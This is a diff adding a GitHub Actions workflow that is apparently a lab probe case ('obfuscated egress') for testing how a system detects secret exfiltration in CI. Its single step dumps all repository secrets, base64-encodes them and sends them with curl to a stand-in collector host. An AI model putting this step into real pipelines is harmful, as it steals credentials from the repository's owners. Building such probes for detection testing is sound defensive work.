@@ -1,0 +1,24 @@
+name: Hold probe 08 - obfuscated egress
+
+on:
+  push:
+    branches:
+      - case-08-obfuscated-egress
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Encode secret context and attempt transfer
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+        run: |
+          printf '%s' "$SECRETS_JSON" \
+            | base64 \
+            | curl --fail --max-time 3 --data-binary @- \
+                https://encoded-collector.invalid/ingest || true
+          printf '%s\n' 'HOLD_LAB_CASE=obfuscated-egress'
